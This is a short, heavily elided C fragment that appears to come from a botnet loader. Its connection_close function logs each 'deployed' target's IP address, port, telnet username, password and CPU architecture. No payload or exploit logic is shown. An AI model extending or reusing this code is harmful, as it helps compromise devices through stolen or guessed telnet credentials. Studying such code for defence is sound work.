...
void connection_close(struct connection *conn)
{
    ...
    if(conn->open)
    {
        ...
        if(conn->success)
        {
            ...
            fprintf(stderr, "\x1B[32mSuccessfully Deployed - %d.%d.%d.%d:%d %s:%s %s %d\x1B[0m\n",
        ...
        else
        {
            ...
            /*fprintf(stderr, "\x1B[31mFailed to Deploy - %d.%d.%d.%d:%d %s:%s %s %d\x1B[0m\n",
                conn->info.addr & 0xff, (conn->info.addr >> 8) & 0xff, (conn->info.addr >> 16) & 0xff, (conn->info.addr >> 24) & 0xff,
                ntohs(conn->info.port),
                conn->info.user, conn->info.pass, conn->info.arch, conn->state_telnet);*/
        }
    }
